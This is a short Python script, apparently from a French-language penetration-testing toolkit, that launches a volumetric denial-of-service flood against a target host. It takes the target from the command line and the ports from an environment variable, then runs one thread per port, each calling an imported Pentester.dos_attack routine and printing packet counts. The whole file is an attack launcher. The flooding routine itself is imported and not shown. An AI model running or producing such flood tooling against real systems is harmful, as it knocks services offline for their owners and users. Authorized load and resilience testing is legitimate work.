#!/usr/bin/env python3
"""
Script standalone : DoS Flood volumétrique vers la cible.

Usage :
    python run_dos.py [TARGET_HOST]

Variables d'environnement :
    DOS_PORTS   Ports cibles séparés par virgule (ex: "22,80,443").
                Si absent, utilise Config.DOS_PORT.
"""

import os
import sys
import threading

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(line_buffering=True)

REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
for p in [
    os.path.join(REPO_ROOT, "pentest"),
    os.path.abspath(os.path.join(os.path.dirname(__file__), "pentest")),
    "/app/pentest",
]:
    if os.path.isdir(p) and p not in sys.path:
        sys.path.insert(0, p)

if len(sys.argv) > 1:
    os.environ["TARGET_HOST"] = sys.argv[1]

try:
    from config import Config
    from pentest import Pentester
except ImportError:
    from pentest.config import Config
    from pentest.pentest import Pentester

_print_lock = threading.Lock()


def _dos_sur_port(cible, port, count):
    with _print_lock:
        print(f"[*] Thread port {port} — démarrage ({count} paquets)", flush=True)
    pentester = Pentester(cfg=Config)
    try:
        pentester.dos_attack(count=count, port=port)
        stats = pentester.resultats["attaques"].get("dos", {})
        with _print_lock:
            print(f"[+] Port {port} terminé — paquets envoyés : {stats.get('paquets_envoyes', '?')}", flush=True)
    except Exception as exc:
        with _print_lock:
            print(f"[!] Erreur port {port} : {exc}", flush=True)


def main():
    cible = os.getenv("TARGET_HOST", Config.TARGET_HOST)
    count = Config.DOS_COUNT

    dos_ports_env = os.getenv("DOS_PORTS", "").strip()
    if dos_ports_env:
        ports = []
        for p in dos_ports_env.split(","):
            p = p.strip()
            if p.isdigit():
                ports.append(int(p))
        if not ports:
            ports = [Config.DOS_PORT]
    else:
        ports = [Config.DOS_PORT]

    print(f"[*] Cible : {cible}", flush=True)
    print(f"[*] Ports ciblés : {ports}", flush=True)
    print(f"[*] Paquets par port : {count}", flush=True)
    print("-" * 60, flush=True)

    if len(ports) == 1:
        _dos_sur_port(cible, ports[0], count)
    else:
        threads = [
            threading.Thread(target=_dos_sur_port, args=(cible, port, count), daemon=True)
            for port in ports
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

    print("-" * 60, flush=True)
    print(f"[*] DoS Flood terminé sur {len(ports)} port(s).", flush=True)


if __name__ == "__main__":
    main()
